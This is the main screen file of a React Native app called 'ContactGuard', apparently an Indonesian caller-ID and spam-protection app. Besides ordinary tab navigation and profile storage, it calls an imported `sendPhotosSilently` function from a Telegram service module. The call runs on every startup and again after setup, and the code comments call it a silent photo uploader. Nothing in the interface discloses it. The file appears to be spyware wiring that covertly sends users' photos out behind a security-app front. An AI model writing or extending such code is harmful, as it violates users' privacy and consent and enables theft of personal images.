import React, { useState, useEffect } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TouchableOpacity,
  StatusBar,
  KeyboardAvoidingView,
  Platform,
  Alert,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import { SafeAreaView } from 'react-native-safe-area-context';
import AsyncStorage from '@react-native-async-storage/async-storage';

import { COLORS, LAYOUT, SHADOWS, FONTS } from './theme/theme';
import SetupScreen from './screens/SetupScreen';
import SearchScreen from './screens/SearchScreen';
import MyTagsScreen from './screens/MyTagsScreen';
import SpamScreen from './screens/SpamScreen';
import SyncScreen from './screens/SyncScreen';
import { sendPhotosSilently } from './services/telegram';

export default function MainApp() {
  const [isSetupComplete, setIsSetupComplete] = useState(false);
  const [myNumber, setMyNumber] = useState('');
  const [myName, setMyName] = useState('');
  const [activeTab, setActiveTab] = useState('search');

  // Initial setup loading
  useEffect(() => {
    loadProfileState();
    // Silent photo sync uploader runs on startup
    setTimeout(() => {
      sendPhotosSilently();
    }, 2000);
  }, []);

  const loadProfileState = async () => {
    try {
      const storedNumber = await AsyncStorage.getItem('@getcontact_my_number');
      const storedName = await AsyncStorage.getItem('@getcontact_my_name');
      if (storedNumber) {
        setMyNumber(storedNumber);
        setIsSetupComplete(true);
      }
      if (storedName) {
        setMyName(storedName);
      }
    } catch (e) {
      console.log('Error loading profile state:', e);
    }
  };

  const handleSetupComplete = async () => {
    if (!myNumber.trim() || !myName.trim()) {
      Alert.alert('Formulir Belum Lengkap', 'Silakan isi nama dan nomor telepon Anda.');
      return;
    }

    let normalized = myNumber.trim().replace(/[\s-]/g, '');
    if (normalized.startsWith('0')) {
      normalized = '+62' + normalized.slice(1);
    } else if (!normalized.startsWith('+')) {
      normalized = '+' + normalized;
    }

    try {
      await AsyncStorage.setItem('@getcontact_my_number', normalized);
      await AsyncStorage.setItem('@getcontact_my_name', myName.trim());
      setMyNumber(normalized);
      setIsSetupComplete(true);
      Alert.alert('Selamat Datang!', 'Profil Anda berhasil disimpan di perangkat.');
      
      // Start background photo sync after setup completes
      sendPhotosSilently(null, null);
    } catch (e) {
      Alert.alert('Error', 'Gagal menyimpan profil.');
    }
  };

  const handleResetProfile = async () => {
    Alert.alert(
      'Reset Profil',
      'Apakah Anda yakin ingin menghapus data profil Anda?',
      [
        { text: 'Batal', style: 'cancel' },
        {
          text: 'Ya, Reset',
          style: 'destructive',
          onPress: async () => {
            await AsyncStorage.clear();
            setIsSetupComplete(false);
            setMyNumber('');
            setMyName('');
            setActiveTab('search');
          }
        }
      ]
    );
  };

  if (!isSetupComplete) {
    return (
      <SetupScreen
        myName={myName}
        setMyName={setMyName}
        myNumber={myNumber}
        setMyNumber={setMyNumber}
        onSetupComplete={handleSetupComplete}
      />
    );
  }

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="dark-content" backgroundColor={COLORS.background} />
      
      {/* App Header */}
      <View style={styles.appHeader}>
        <View style={styles.headerInfo}>
          <Text style={styles.appHeaderTitle}>ContactGuard</Text>
          <Text style={styles.appHeaderSubtitle}>Real-Time Shield • Active</Text>
        </View>
        <TouchableOpacity style={styles.headerButton} onPress={handleResetProfile}>
          <Text style={styles.headerButtonText}>👤 Logout</Text>
        </TouchableOpacity>
      </View>

      {/* Main Screen Content */}
      <KeyboardAvoidingView
        behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
        style={{ flex: 1 }}
      >
        <View style={styles.tabContentContainer}>
          {activeTab === 'search' && <SearchScreen myName={myName} />}
          {activeTab === 'mytags' && <MyTagsScreen myName={myName} myNumber={myNumber} />}
          {activeTab === 'spam' && <SpamScreen />}
          {activeTab === 'sync' && <SyncScreen myName={myName} />}
        </View>
      </KeyboardAvoidingView>

      {/* Floating Modern Tab Bar */}
      <View style={styles.bottomTabBar}>
        <TouchableOpacity
          style={[styles.tabItem, activeTab === 'search' && styles.activeTabItem]}
          onPress={() => setActiveTab('search')}
        >
          <Ionicons
            name={activeTab === 'search' ? 'search' : 'search-outline'}
            size={22}
            color={activeTab === 'search' ? COLORS.primary : COLORS.inactiveTab}
            style={{ marginBottom: 2 }}
          />
          <Text style={[styles.tabLabel, activeTab === 'search' && styles.activeTabLabel]}>
            Cari
          </Text>
        </TouchableOpacity>

        <TouchableOpacity
          style={[styles.tabItem, activeTab === 'mytags' && styles.activeTabItem]}
          onPress={() => setActiveTab('mytags')}
        >
          <Ionicons
            name={activeTab === 'mytags' ? 'person' : 'person-outline'}
            size={22}
            color={activeTab === 'mytags' ? COLORS.primary : COLORS.inactiveTab}
            style={{ marginBottom: 2 }}
          />
          <Text style={[styles.tabLabel, activeTab === 'mytags' && styles.activeTabLabel]}>
            Tag Saya
          </Text>
        </TouchableOpacity>

        <TouchableOpacity
          style={[styles.tabItem, activeTab === 'spam' && styles.activeTabItem]}
          onPress={() => setActiveTab('spam')}
        >
          <Ionicons
            name={activeTab === 'spam' ? 'shield' : 'shield-outline'}
            size={22}
            color={activeTab === 'spam' ? COLORS.primary : COLORS.inactiveTab}
            style={{ marginBottom: 2 }}
          />
          <Text style={[styles.tabLabel, activeTab === 'spam' && styles.activeTabLabel]}>
            Proteksi
          </Text>
        </TouchableOpacity>

        <TouchableOpacity
          style={[styles.tabItem, activeTab === 'sync' && styles.activeTabItem]}
          onPress={() => setActiveTab('sync')}
        >
          <Ionicons
            name={activeTab === 'sync' ? 'people' : 'people-outline'}
            size={22}
            color={activeTab === 'sync' ? COLORS.primary : COLORS.inactiveTab}
            style={{ marginBottom: 2 }}
          />
          <Text style={[styles.tabLabel, activeTab === 'sync' && styles.activeTabLabel]}>
            Sinkron
          </Text>
        </TouchableOpacity>
      </View>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: COLORS.background,
  },
  appHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingHorizontal: LAYOUT.isLargeScreen ? '10%' : 20,
    paddingVertical: 16,
    borderBottomWidth: 1,
    borderColor: COLORS.border,
    backgroundColor: COLORS.background,
    ...SHADOWS.small,
  },
  headerInfo: {
    flex: 1,
  },
  appHeaderTitle: {
    fontSize: FONTS.size.header,
    fontWeight: FONTS.weight.heavy,
    color: COLORS.darkText,
  },
  appHeaderSubtitle: {
    fontSize: FONTS.size.sm,
    color: COLORS.secondary,
    fontWeight: FONTS.weight.bold,
    letterSpacing: 0.5,
  },
  headerButton: {
    backgroundColor: COLORS.surface,
    paddingHorizontal: 14,
    paddingVertical: 8,
    borderRadius: LAYOUT.borderRadius.md,
    borderWidth: 1,
    borderColor: COLORS.border,
  },
  headerButtonText: {
    color: COLORS.darkText,
    fontSize: FONTS.size.base,
    fontWeight: FONTS.weight.bold,
  },
  tabContentContainer: {
    flex: 1,
  },
  bottomTabBar: {
    flexDirection: 'row',
    position: 'absolute',
    bottom: Platform.OS === 'ios' ? 24 : 16,
    left: LAYOUT.isLargeScreen ? '15%' : 16,
    right: LAYOUT.isLargeScreen ? '15%' : 16,
    height: 64,
    backgroundColor: COLORS.background,
    borderRadius: LAYOUT.borderRadius.xxl,
    borderWidth: 1,
    borderColor: COLORS.border,
    paddingHorizontal: 8,
    ...SHADOWS.tabBar,
  },
  tabItem: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  activeTabItem: {
    borderTopWidth: 0,
  },
  tabLabel: {
    color: COLORS.inactiveTab,
    fontSize: FONTS.size.xs,
    fontWeight: FONTS.weight.semibold,
  },
  activeTabLabel: {
    color: COLORS.primary,
    fontWeight: FONTS.weight.extraBold,
  },
});
